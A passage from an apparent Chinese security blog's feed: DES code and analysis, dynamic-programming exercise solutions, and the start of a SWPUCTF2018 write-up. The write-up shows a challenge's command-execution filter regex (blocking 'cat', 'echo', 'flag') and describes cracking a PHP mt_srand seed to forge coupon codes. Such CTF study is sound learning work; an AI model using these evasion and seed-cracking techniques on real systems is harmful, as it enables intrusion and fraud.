class="number">32</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>,<span class="number">1</span>,<span class="number">-1</span>):</span><br><span class="line">l[i<span class="number">-1</span>] = r[i]</span><br><span class="line">secret_key = generate_secretkey(key,i) <span class="comment"># 生成子秘钥</span></span><br><span class="line">f_result = f_function(r[i],secret_key,i)</span><br><span class="line">r[i<span class="number">-1</span>] = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">r[i<span class="number">-1</span>] += str(int(l[i][j])^int(f_result[j]))</span><br><span class="line">r[<span class="number">0</span>] = r[<span class="number">1</span>]</span><br><span class="line">secret_key = generate_secretkey(key,<span class="number">1</span>)</span><br><span class="line">l[<span class="number">0</span>] = <span class="string">""</span></span><br><span class="line">f_result = f_function(r[<span class="number">1</span>],secret_key,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">l[<span class="number">0</span>] += str(int(l[<span class="number">1</span>][j])^int(f_result[j]))</span><br><span class="line">temp = l[<span class="number">0</span>] + r[<span class="number">0</span>]</span><br><span class="line">bintext = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">bintext += temp[_ip[i]]</span><br><span class="line">plaintext = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">plaintext += chr(int(bintext[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"><span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2bin</span><span class="params">(text)</span>:</span></span><br><span class="line"><span class="keyword">if</span> len(text) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">text = text + <span class="string">" "</span>*(<span class="number">8</span>-(len(text)%<span class="number">8</span>))</span><br><span class="line">binplain = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">binplain += <span class="string">'&#123;:0&gt;8&#125;'</span>.format(bin(ord(i))[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">return</span> binplain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(text, key)</span>:</span></span><br><span class="line">longbinplain = str2bin(text)</span><br><span class="line">group_plain = <span class="string">""</span></span><br><span class="line">longcipher = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(longbinplain)//<span class="number">64</span>):</span><br><span class="line">group_plain = <span class="string">""</span></span><br><span class="line">group_plain = longbinplain[<span class="number">64</span>*i:<span class="number">64</span>*i+<span class="number">64</span>]</span><br><span class="line">longcipher += des_encrypt(group_plain,key)</span><br><span class="line"><span class="keyword">return</span> longcipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher,key)</span>:</span></span><br><span class="line">plaintext = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)//<span class="number">16</span>):</span><br><span class="line">plaintext += des_decrypt(cipher[<span class="number">16</span>*i:<span class="number">16</span>*i+<span class="number">16</span>], key)</span><br><span class="line"><span class="keyword">return</span> plaintext.rstrip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">mode =  sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">while</span> mode <span class="keyword">in</span> (<span class="string">"e"</span>,<span class="string">"d"</span>):</span><br><span class="line">data = input(<span class="string">"Plz input data: "</span>)</span><br><span class="line">key = str(input(<span class="string">"Plz input key: "</span>))</span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">"e"</span>:</span><br><span class="line">ans = encrypt(data, key)</span><br><span class="line">print(ans)</span><br><span class="line"><span class="keyword">elif</span> mode == <span class="string">"d"</span>:</span><br><span class="line">ans = decrypt(data, key)</span><br><span class="line">print(ans)</span><br><span class="line">mode = input(<span class="string">"quit or continue?\n"</span>)</span><br></pre></td></tr></table></div></figure><p>为了增强通用性，增加代码重用性，该算法使用了包封装，从而使其能够被其它程序重用。该DES支持短信息加密，也支持长消息加密。为了使密文便于显示和存储转化为16进制显示</p><p><em>实例演示：</em></p><p><img src="/2019/01/15/crypto1/4.png" alt="demo"></p><p><em>安全性分析</em></p><p>​    DES算法具有极高的安全性，到目前为止，除了用穷举搜索法对DES算法进行攻击外，还没有发现更有效的办法。 而56位长的密钥的穷举空间为2^56，这意味着如果一台计算机的速度是每一秒钟检测一百万个密钥，则它搜索完全部密钥就需要将近2285年的时间，可见，这是难以实现的。然而，这并不等于说DES是不可破解的。而实际上，随着硬件技术和Internet的发展，其破解的可能性越来越大，而且，所需要的时间越来越少。使用经过特殊设计的硬件并行处理要几个小时。</p><p>​    由DES算法的密钥生成步骤中我们可以看到：DES算法中只用到64位密钥中的其中56位，而第8、16、24、……64位8个位并未参与DES运算，这一点，向我们提出了一个应用上的要求，即DES的安全性是基于除了8，16，24，……64位外的其余56位的组合变化256才得以保证的。因此，在实际应用中，我们应避开使用第8，16，24，……64位作为有效数据位，而使用其它的56位作为有效数据位，才能保证DES算法安全可靠地发挥作用。如果不了解这一点，把密钥Key的8，16，24，….. .64位作为有效数据使用，将不能保证DES加密数据的安全性，对运用DES来达到保密作用的系统产生数据被破译的危险，这正是DES算法在应用上的误区，留下了被人攻击、被人破译的极大隐患。</p><p>​    此外，由于DES算法各轮（F函数）的子密钥是通过改变初始密钥这种方式得到的，因此有些初始密钥成了弱密钥（weakkey）。初始密钥分成两部分，每部分各自独立的移动。如果每一部分的所有位都是0或1，那么算法的任意一个周期的密钥都是相同的。当密钥是全1、全0、或者一半全1、一半全0时，会发生这种情况。所以<em>我们在选择密钥时要进行检查，以防止产生弱密钥</em>。</p><p>​    随着密码学的发展，差分分析和线性分析的发展对分组密码的安全性构成了挑战，也推动了分组密码设计技术的发展。</p><p>​    随着计算机计算能力的提高与密码分析技术的进步，DES的密钥长度已经被证明不能够满足当前安全性能的需求，为了克服DES密钥空间小的缺陷，人们又提出了三重DES的变形形式，即使用多个不同的DES秘钥利用DES算法对明文进行多次加密，这样可以增加密钥量。</p><p><em>算法实用性分析</em></p><p>​    DES算法拥有着良好的安全性，目前最有效的破解方法依然是穷举攻击，所以在一些安全性要求相对不高的情况下可以使用DES算法，此外，由于DES的广泛的使用量，为了充分利用有关DES的软硬件资源，可以使用DES的改进算法如三重DES算法等。</p><p>​    由于DES算法要进行多轮迭代，所以DES的运算速度相对较慢，此外，密码生命周期也比较短。</p><hr><p>​    分组密码与序列密码相比，具有扩散性好，插入敏感等优点，缺点是加解密处理速度慢、存在错误传播。用途上，在对于处理数据分组的应用，比如文件传递、电子邮件，分组密码非常合适。 </p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;
          &lt;a href=&quot;#前言&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;前言&lt;/h1&gt;
      &lt;p&gt;最近在学习密码学，研究了一些密码学算法，特此记录一下。&lt;/p&gt;
    
    </summary>
    
      <category term="Record" scheme="http://chaosec.top/categories/Record/"/>
    
    
      <category term="Crypto" scheme="http://chaosec.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>简单算法记录</title>
    <link href="http://chaosec.top/2019/01/01/suanfa/"/>
    <id>http://chaosec.top/2019/01/01/suanfa/</id>
    <published>2019-01-01T08:45:12.000Z</published>
    <updated>2019-01-30T12:26:10.697Z</updated>
    
    <content type="html"><![CDATA[        <h1 id="前言">          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h1>      <p>最近在刷oj，感觉自己菜的抠脚，算法也不是很熟悉，需要加强一下，正好也为了后面的oj测试准备一下</p><a id="more"></a>        <h1 id="动态规划">          <a href="#动态规划" class="heading-link"><i class="fas fa-link"></i></a>动态规划</h1>              <h2 id="最长公共子序列">          <a href="#最长公共子序列" class="heading-link"><i class="fas fa-link"></i></a>最长公共子序列</h2>      <blockquote><p>题目描述<br>给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。<br>例如：Z=<a,b,f,c>是序列X=<a,b,c,f,b,c>的一个子序列，Z中的元素在X中的下标序列为<1,2,4,6>。<br>现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？</1,2,4,6></a,b,c,f,b,c></a,b,f,c></p><p>输入<br>输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。</p><p>输出<br>对于每组输入，输出两个字符串的最长公共子序列的长度。</p></blockquote><p>最长公共子序列问题，递推公式为</p><p><img src="/2019/01/01/suanfa/1.png" alt></p><figure class="highlight cpp"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> x;</span><br><span class="line"><span class="built_in">string</span> y;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">105</span>][<span class="number">105</span>],c[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LCSLength</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=m;i++) c[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n;i++) c[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(x[i]==y[j])&#123;</span><br><span class="line">c[i][j] = c[i<span class="number">-1</span>][j<span class="number">-1</span>] + <span class="number">1</span>;</span><br><span class="line">b[i][j] = <span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(c[i<span class="number">-1</span>][j]&gt;c[i][j<span class="number">-1</span>])&#123;</span><br><span class="line">c[i][j] = c[i<span class="number">-1</span>][j];</span><br><span class="line">b[i][j] = <span class="number">2</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">c[i][j] = c[i][j<span class="number">-1</span>];</span><br><span class="line">b[i][j] = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//寻找最优解</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">traceback</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">-1</span>||j==<span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(b[i][j]==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;x[i];</span><br><span class="line">traceback(i<span class="number">-1</span>,j<span class="number">-1</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(b[i][j]==<span class="number">2</span>) traceback(i<span class="number">-1</span>,j);</span><br><span class="line"><span class="keyword">else</span> traceback(i,j<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y)&#123;</span><br><span class="line"><span class="keyword">int</span> a = x.length();</span><br><span class="line"><span class="keyword">int</span> b = y.length();</span><br><span class="line">LCSLength(a,b);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;c[a<span class="number">-1</span>][b<span class="number">-1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">traceback(a<span class="number">-1</span>, b<span class="number">-1</span>);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="最大字段和">          <a href="#最大字段和" class="heading-link"><i class="fas fa-link"></i></a>最大字段和</h2>      <blockquote><p>题目描述<br>给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。</p><p>输入<br>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。<br>每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。<br>接下来一行有n个数x(-1000&lt;=x&lt;=1000)。</p><p>输出<br>输出其对应的最大子段和。</p></blockquote><p>递推公式</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b[i] &#x3D; max&#123;b[i-1]+a[i], a[i]&#125;  (1≤i≤n)</span><br></pre></td></tr></table></div></figure><figure class="highlight cpp"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> num[<span class="number">10005</span>];</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//再给出输出最优解的方法</span></span><br><span class="line"><span class="keyword">int</span> temp_start,len;</span><br><span class="line"><span class="keyword">int</span> besti,bestj;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_res</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=besti;i&lt;bestj;i++)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;num[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t,n;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ans =<span class="number">0</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;num[i];</span><br><span class="line">&#125;</span><br><span class="line">temp_start = <span class="number">0</span>;</span><br><span class="line">len = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(b&gt;<span class="number">0</span>)&#123;</span><br><span class="line">b = b + num[i];</span><br><span class="line">len++;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">b = num[i];</span><br><span class="line">temp_start = i;</span><br><span class="line">len = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(ans &lt; b)&#123;</span><br><span class="line">ans = b;</span><br><span class="line">besti = temp_start;</span><br><span class="line">bestj = temp_start + len;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//get_res();</span></span><br><span class="line">t--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="矩阵连乘">          <a href="#矩阵连乘" class="heading-link"><i class="fas fa-link"></i></a>矩阵连乘</h2>      <p>待续</p>        <h2 id="0-1背包">          <a href="#0-1背包" class="heading-link"><i class="fas fa-link"></i></a>0-1背包</h2>      <blockquote><p>题目描述<br>已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。</p><p>输入<br>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。</p><p>接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围）</p><p>输出<br>对每组测试数据，输出其对应的所装物品的最大价值。</p></blockquote><p><img src="/2019/01/01/suanfa/2.png" alt="递推公式"></p><figure class="highlight cpp"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> c,n;</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">long</span> w[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">long</span> v[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> m[<span class="number">1005</span>][<span class="number">10005</span>];<span class="comment">//数组长度要开的合适一点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pack</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;w[n];i++) m[n][i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=w[n];i&lt;=c;i++) m[n][i] = v[n];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;w[i];j++) m[i][j] = m[i+<span class="number">1</span>][j];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=w[i];j&lt;=c;j++)&#123;</span><br><span class="line">m[i][j] = max(m[i+<span class="number">1</span>][j],m[i+<span class="number">1</span>][j-w[i]]+v[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//利用m的下标的意义来构造最优解 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">traceback</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(m[i][c]!=m[i+<span class="number">1</span>][c])&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;i&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">c -= w[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;c&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="built_in">cin</span>&gt;&gt;w[i]&gt;&gt;v[i]; </span><br><span class="line">pack();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m[<span class="number">1</span>][c]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//traceback();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;
          &lt;a href=&quot;#前言&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;前言&lt;/h1&gt;
      &lt;p&gt;最近在刷oj，感觉自己菜的抠脚，算法也不是很熟悉，需要加强一下，正好也为了后面的oj测试准备一下&lt;/p&gt;
    
    </summary>
    
      <category term="Record" scheme="http://chaosec.top/categories/Record/"/>
    
    
      <category term="Algorithm" scheme="http://chaosec.top/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>SWPUCTF2018复现</title>
    <link href="http://chaosec.top/2018/12/20/SWPUCTF2018/"/>
    <id>http://chaosec.top/2018/12/20/SWPUCTF2018/</id>
    <published>2018-12-20T05:00:25.000Z</published>
    <updated>2019-02-16T08:30:36.955Z</updated>
    
    <content type="html"><![CDATA[<p>题目复现</p><a id="more"></a>        <h1 id="MISC">          <a href="#MISC" class="heading-link"><i class="fas fa-link"></i></a>MISC</h1>      <p>其它两道都很简单，就不记录了，只记录一下没做出来的</p>        <h2 id="唯有低头-才能出头">          <a href="#唯有低头-才能出头" class="heading-link"><i class="fas fa-link"></i></a>唯有低头,才能出头</h2>      <p>做的时候知道是键盘加密，但是对于数字理解错误了，我以为是手机键盘的九键加密…，所以走远了，记录一下这种加密方法，对应于键盘的盲打手势对应字母</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33</span><br><span class="line">lookatthekeyboard</span><br></pre></td></tr></table></div></figure><!-- swpuctf{lookatthekeyboard} -->        <h1 id="WEB">          <a href="#WEB" class="heading-link"><i class="fas fa-link"></i></a>WEB</h1>              <h2 id="用优惠码-买个-X">          <a href="#用优惠码-买个-X" class="heading-link"><i class="fas fa-link"></i></a>用优惠码 买个 X?</h2>      <p>注册并登录之后，页面弹出一个优惠码 <code>uKnfZ2F0aFaZBFy</code> ，但是输入之后却失效，要求我们输入24位的优惠码，题目存在文件泄露 <code>www.zip</code>，下载源码</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//生成优惠码</span></span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">youhuima</span><span class="params">()</span></span>&#123;</span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(<span class="string">'Auth'</span>, $auth);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//support</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span><br><span class="line">               <span class="comment">//执行命令</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//flag字段和某些字符被过滤!</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">// 你的输入不正确!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>可以看出题目使用了md_srand()函数来产生随机数，而PHP中产生的是伪随机数，即只要我们知道种子的话，那么后续产生的随机数我们也就都可以知道，所以现在就是要爆破随机数种子，可以用php_me_seed工具来爆破，速度快一些，但是我们要先将数据处理为该工具能够识别的输入参数</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$pass = <span class="string">"b1o2OrrgqYPMkzK"</span>;</span><br><span class="line">$str_rand = <span 